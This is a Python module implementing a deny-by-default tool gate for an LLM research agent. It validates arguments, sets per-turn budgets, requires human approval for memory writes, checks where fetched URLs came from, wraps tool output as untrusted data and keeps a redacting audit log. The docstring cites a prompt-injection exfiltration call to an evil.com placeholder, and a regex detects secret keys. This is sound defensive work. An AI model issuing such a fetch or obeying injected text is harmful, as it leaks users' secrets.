"""
tool_gate.py — the single checkpoint between "the model asked for a tool" and
"the tool runs". See SECURITY.md §1 and §5.

Deny by default. A call runs only if:
  1. the tool is registered in SPECS,
  2. every argument is declared, required ones are present, and all values pass validation,
  3. the per-turn budget for the tool's risk tier is not used up,
  4. for "write" tools, a human approved it (no approver → denied, never auto-approved),
  5. for web_fetch (when provenance is on), the URL came from this turn's search
     results or the user's own message — otherwise a human must approve it.
     This blocks exfiltration like web_fetch("https://evil.com/?d=<secret>")
     requested by injected text.

Both agent.py and mcp_agent_server.py call tools only through ToolGate.
Program code that picks its own arguments (e.g. the forced search in agent.py)
may call tools.py directly.
"""

import hashlib
import json
import os
import re
import sys
import urllib.parse
from collections import Counter
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Callable, Optional

import tools


class Denied(Exception):
    """A tool call violated the policy. The message is shown to the model."""


# ── Argument validators: each returns the cleaned value or raises Denied ─────

def Str(max_len: int):
    def check(v):
        if not isinstance(v, str):
            raise Denied("must be a string")
        if len(v) > max_len:
            raise Denied(f"longer than {max_len} characters")
        return v
    return check


def Int(lo: int, hi: int):
    def check(v):
        if isinstance(v, str) and v.strip().lstrip("-").isdigit():
            v = int(v)  # small models often send "4" instead of 4
        if isinstance(v, bool) or not isinstance(v, int):
            raise Denied("must be an integer")
        if not lo <= v <= hi:
            raise Denied(f"must be between {lo} and {hi}")
        return v
    return check


def Match(pattern: str):
    rx = re.compile(pattern)
    def check(v):
        if not isinstance(v, str) or not rx.fullmatch(v):
            raise Denied(f"must match {pattern}")
        return v
    return check


def Choice(*options: str):
    def check(v):
        if v not in options:
            raise Denied(f"must be one of {list(options)}")
        return v
    return check


def StrList(max_items: int, max_len: int):
    item = Str(max_len)
    def check(v):
        if not isinstance(v, list):
            raise Denied("must be a list of strings")
        if len(v) > max_items:
            raise Denied(f"more than {max_items} items")
        return [item(x) for x in v]
    return check


# ── Tool registry: the only tools the model can reach ────────────────────────

@dataclass(frozen=True)
class Spec:
    fn: Callable[..., str]
    risk: str                 # "none" | "read" | "network" | "write"
    args: dict                # name → validator
    required: tuple = ()


SPECS = {
    "web_search": Spec(tools.web_search, "network", {
        "query": Str(300), "num_results": Int(1, 10),
        "mode": Choice("auto", "news", "text"),
    }, required=("query",)),
    "web_fetch": Spec(tools.web_fetch, "network", {
        "url": Str(2000),     # timeout is deliberately not model-settable
    }, required=("url",)),
    "write_essay": Spec(tools.write_essay, "none", {
        "topic": Str(300), "thesis": Str(1000),
        "key_arguments": StrList(6, 500), "evidence": StrList(6, 2000),
        "counterargument": Str(2000), "style": Choice("think-tank", "op-ed", "briefing"),
    }, required=("topic", "thesis", "key_arguments", "evidence")),
    "get_best_sources": Spec(tools.get_best_sources, "read", {
        "topic_tag": Str(50), "limit": Int(1, 20),
    }),
    "recall_writing_feedback": Spec(tools.recall_writing_feedback, "read", {
        "component": Str(50), "limit": Int(1, 20),
    }),
    "rate_source": Spec(tools.rate_source, "write", {
        "source_name": Str(100), "quality": Int(1, 5),
        "reason": Str(500), "topic_tag": Str(50),
    }, required=("source_name", "quality", "reason")),
    "log_writing_feedback": Spec(tools.log_writing_feedback, "write", {
        "component": Choice("thesis", "counterargument", "conclusion", "argument",
                            "executive_summary", "recommendations", "overall"),
        "feedback": Str(1000), "sentiment": Choice("positive", "negative"),
        "content_snippet": Str(300), "topic_tag": Str(50),
    }, required=("component", "feedback", "sentiment")),
}

# Max allowed calls per risk tier per turn — stops runaway tool loops.
DEFAULT_BUDGET = {"none": 3, "read": 6, "network": 6, "write": 3}

# approver(tool_name, cleaned_args, reason) → True to allow
Approver = Callable[[str, dict, str], bool]

_URL_RE = re.compile(r"https?://[^\s<>\"'()\[\]{}]+", re.IGNORECASE)


def _norm_url(url: str) -> str:
    """Canonical form for provenance comparison: no fragment, no trailing slash
    or punctuation, lowercase scheme and host."""
    p = urllib.parse.urlsplit(url.strip().rstrip(".,;:!?"))
    return urllib.parse.urlunsplit(
        (p.scheme.lower(), p.netloc.lower(), p.path.rstrip("/"), p.query, ""))


def wrap_untrusted(tool_name: str, text: str, tag: str = "tool_output") -> str:
    """Tag tool output as data. Neutralise a fake closing tag inside the content
    so injected text can't 'escape' the wrapper."""
    text = re.sub(rf"</\s*{tag}", f"&lt;/{tag}", text, flags=re.IGNORECASE)
    return f'<{tag} tool="{tool_name}" trusted="false">\n{text}\n</{tag}>'


# ── Audit log (SECURITY.md §6) ────────────────────────────────────────────────

_SECRET_RE = re.compile(
    r"-----BEGIN [A-Z ]*PRIVATE KEY-----"
    r"|\b(?:sk|pk|rk)-[A-Za-z0-9_-]{16,}"          # OpenAI/Anthropic/Stripe-style keys
    r"|\bgh[pousr]_[A-Za-z0-9]{20,}"               # GitHub tokens
    r"|\bAKIA[0-9A-Z]{16}\b"                       # AWS access key IDs
    r"|\b(?:password|passwd|secret|token|api[_-]?key)\s*[=:]\s*\S+",
    re.IGNORECASE)


def _redact(value, limit: int = 300):
    """Mask anything that looks like a secret, and truncate, before it is logged."""
    if isinstance(value, list):
        return [_redact(v, limit) for v in value[:10]]
    if not isinstance(value, str):
        return value
    value = _SECRET_RE.sub("[REDACTED]", value)
    return value if len(value) <= limit else value[:limit] + "…"


class AuditLog:
    """Append-only JSONL log: one line per tool call decision.
    Rotates to <name>.1 when it exceeds max_bytes. Never raises — a logging
    failure is reported on stderr but must not crash the agent."""

    def __init__(self, path, host: str, max_bytes: int = 5_000_000):
        self.path = Path(path)
        self.host = host
        self.max_bytes = max_bytes
        self.session = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S") + f"-{os.getpid()}"

    def write(self, **event) -> None:
        record = {"ts": datetime.now(timezone.utc).isoformat(timespec="seconds"),
                  "session": self.session, "host": self.host, **event}
        try:
            self.path.parent.mkdir(parents=True, exist_ok=True)
            if self.path.exists() and self.path.stat().st_size > self.max_bytes:
                self.path.replace(self.path.with_name(self.path.name + ".1"))
            with self.path.open("a", encoding="utf-8") as f:
                f.write(json.dumps(record, ensure_ascii=False) + "\n")
        except OSError as e:
            print(f"[audit] failed to write {self.path}: {e}", file=sys.stderr)


class ToolGate:
    """
    confirm:    asks a human to approve a call; None means non-interactive, so
                anything needing approval is denied.
    budget:     per-turn limits by risk tier; None disables budgeting (for hosts
                with no notion of a turn, e.g. the MCP server).
    provenance: restrict web_fetch to URLs seen this turn (search results or the
                user's message). Off for MCP, where the server cannot see the
                user's message and the MCP client approves each call.
    specs:      tool registry; defaults to SPECS.
    audit:      AuditLog that records every decision; None disables logging.
    """

    def __init__(self, confirm: Optional[Approver], budget: Optional[dict] = DEFAULT_BUDGET,
                 provenance: bool = True, specs: Optional[dict] = None,
                 audit: Optional[AuditLog] = None):
        self.confirm = confirm
        self.budget = budget
        self.provenance = provenance
        self.specs = SPECS if specs is None else specs
        self.audit = audit
        self.used = Counter()
        self.allowed_urls = set()

    def _log(self, name: str, args, decision: str, *, risk: str = "", reason: str = "",
             result: Optional[str] = None) -> None:
        if self.audit is None:
            return
        event = {"tool": name, "risk": risk, "decision": decision,
                 "args": {k: _redact(v) for k, v in args.items()} if isinstance(args, dict) else _redact(str(args))}
        if reason:
            event["reason"] = _redact(reason)
        if result is not None:
            event["result_len"] = len(result)
            event["result_sha256"] = hashlib.sha256(result.encode("utf-8", "replace")).hexdigest()[:16]
            if result.startswith("Blocked by security policy"):
                event["blocked"] = _redact(result)
        self.audit.write(**event)

    def record_program_call(self, name: str, args: dict, result: str) -> None:
        """Log a tool call made by program code (not the model), e.g. the forced search."""
        spec = self.specs.get(name)
        self._log(name, args, "program", risk=spec.risk if spec else "", result=result)

    def new_turn(self, user_text: str = "") -> None:
        self.used.clear()
        self.allowed_urls.clear()
        self.allow_urls_from(user_text)

    def allow_urls_from(self, text: str) -> None:
        """Record URLs that may be fetched this turn (user text, search results)."""
        self.allowed_urls.update(_norm_url(u) for u in _URL_RE.findall(text or ""))

    def _approve(self, name: str, clean: dict, reason: str) -> str:
        if self.confirm is None:
            raise Denied(f"{reason}; human approval is unavailable in non-interactive mode")
        if not self.confirm(name, clean, reason):
            raise Denied(f"the user declined {name} ({reason})")
        return reason

    def check(self, name: str, args) -> tuple:
        """Return (spec, cleaned_args, approval_reasons) or raise Denied.
        Approval happens last, so humans are only asked about valid calls."""
        spec = self.specs.get(name)
        if spec is None:
            raise Denied(f"unknown tool '{name}'. Available: {list(self.specs)}")
        if not isinstance(args, dict):
            raise Denied("arguments must be a JSON object")
        unknown = set(args) - set(spec.args)
        if unknown:
            raise Denied(f"{name} does not accept {sorted(unknown)}")
        missing = set(spec.required) - set(args)
        if missing:
            raise Denied(f"{name} requires {sorted(missing)}")
        clean = {}
        for key, value in args.items():
            try:
                clean[key] = spec.args[key](value)
            except Denied as e:
                raise Denied(f"{name}.{key} {e}")
        if self.budget is not None and self.used[spec.risk] >= self.budget[spec.risk]:
            raise Denied(f"per-turn limit for {spec.risk} tools reached; answer with what you have")
        approvals = []
        if spec.risk == "write":
            approvals.append(self._approve(name, clean, f"{name} writes persistent memory"))
        if (name == "web_fetch" and self.provenance
                and _norm_url(clean["url"]) not in self.allowed_urls):
            approvals.append(self._approve(
                name, clean, "URL is not from this turn's search results or your message"))
        return spec, clean, approvals

    def call(self, name: str, args) -> tuple:
        """Return (observation, ran). Never raises. Every outcome is audited."""
        risk = self.specs[name].risk if name in self.specs else ""
        try:
            spec, clean, approvals = self.check(name, args)
        except Denied as e:
            self._log(name, args, "denied", risk=risk, reason=str(e))
            return f"Denied by policy: {e}", False
        self.used[spec.risk] += 1
        decision = "user_approved" if approvals else "allowed"
        try:
            result = spec.fn(**clean)
        except Exception as e:
            self._log(name, clean, "error", risk=risk, reason=f"{decision}; {e}")
            return f"Tool error: {e}", False
        self._log(name, clean, decision, risk=risk, reason="; ".join(approvals), result=result)
        if name == "web_search":
            self.allow_urls_from(result)
        return result, True


def ask_in_terminal(name: str, args: dict, reason: str) -> bool:
    """Interactive approver for the CLI."""
    shown = ", ".join(f"{k}={v!r:.60}" for k, v in args.items())
    try:
        reply = input(f"\n  ⚠ ARIA wants to run {name}({shown})\n"
                      f"    Why approval is needed: {reason}\n    Allow? [y/N] ")
    except EOFError:
        return False
    return reply.strip().lower() == "y"
